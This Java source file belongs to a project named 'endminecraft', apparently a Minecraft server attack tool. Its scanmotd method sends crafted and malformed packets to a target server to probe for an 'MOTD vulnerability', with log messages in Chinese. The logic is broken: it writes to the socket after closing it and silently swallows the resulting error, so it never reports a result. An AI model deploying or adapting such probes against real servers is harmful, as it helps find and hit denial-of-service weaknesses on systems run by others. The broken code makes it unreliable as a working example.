package me.alikomi.endminecraft.Tasks;

import me.alikomi.endminecraft.utils.Util;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ScanBug extends Util {
    public static void scanmotd(String ip, int port) {
        log("正在进行MOTD漏洞扫描，请等待");
        try {
            final Socket socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port));
            final byte[] head = new byte[]{0x07, 0x00, 0x04, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01};
            if (socket.isConnected() && !socket.isClosed()) {
                final OutputStream out = socket.getOutputStream();
                out.write(head);
                out.flush();
                socket.close();
                for (int i = 0; i < 10; i++) {
                    out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                }
                out.flush();
                Thread.sleep(800);
                if (socket.isConnected() && !socket.isClosed()) {
                    log("发现MOTD漏洞");
                }else {
                    log("无MOTD漏洞");
                }
            }
            socket.close();
        } catch (final Exception ignored) {

        }
    }
}
